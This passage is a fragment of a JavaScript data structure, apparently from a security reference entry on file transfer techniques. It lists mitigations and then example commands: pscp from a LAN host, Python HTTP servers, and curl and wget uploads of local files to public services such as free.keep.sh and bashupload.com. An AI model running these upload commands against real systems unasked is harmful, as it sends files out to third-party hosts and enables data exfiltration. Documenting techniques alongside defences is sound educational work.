      "Restrict outbound connections to limit file transfer capabilities",
      "Apply proper access controls to limit where files can be written on systems"
    ],
    methodology: {
      tools: [
        {
          name: "SSH/SCP",
          commands: [
            "pscp user@192.168.138.116:/Users/Aniket/Desktop/task.txt ~/Documents"
          ]
        },
        {
          name: "Python HTTP Server",
          commands: [
            "python -m SimpleHTTPServer 9000",
            "python3 -m http.server 9000"
          ]
        },
        {
          name: "Keep.sh",
          commands: [
            "curl --upload-file ./your-file.txt https://free.keep.sh",
            "curl -L https://free.keep.sh/9ab64df49d/your-file.txt > your-file.txt"
          ]
        },
        {
          name: "Bashupload",
          commands: [
            "curl bashupload.com -T your_file.txt",
            "wget bashupload.com -T your_file.txt"
          ]
        }
      ]
    }
  }
];
